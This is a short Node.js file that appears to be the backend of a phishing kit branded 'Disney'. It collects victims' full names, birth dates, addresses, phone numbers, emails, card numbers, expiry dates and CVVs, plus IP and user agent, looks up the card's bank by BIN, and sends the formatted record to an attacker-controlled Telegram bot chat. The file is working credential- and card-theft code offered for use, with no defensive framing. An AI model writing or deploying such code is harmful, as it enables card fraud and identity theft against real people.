const axios = require("axios");

const sendRes = async (req, res) => {
	let {
		email,
		fullname,
		dob,
		city,
		address,
		zip,
		telephone,
		ccname,
		ccnum,
		ccexp,
		cvv,
		userAgent,
		ip,
		bin,
		telegramId,
	} = req.body;

	if (bin.length === 7) {
		formatBin = bin.replace(/ /g, "");
		if (formatBin.length === 7) {
			formatBin = bin.slice(0, -1);
		}
		bin = formatBin;
	}

	const response = await axios.get(`https://lookup.binlist.net/${bin}`);
	let bankName;

	if (response.data.bank) {
		bankName = response.data.bank.name;
	}

	binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
	var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${zip}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;

	await axios
		.post(
			`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
			{
				chat_id: telegramId,
				text: `Disney\n${originalText}`,
				parse_mode: "Markdown",
			}
		)
		.catch((e) => {
			console.log(e);
		});
	res.sendStatus(200);
};

module.exports = {
	sendRes,
};
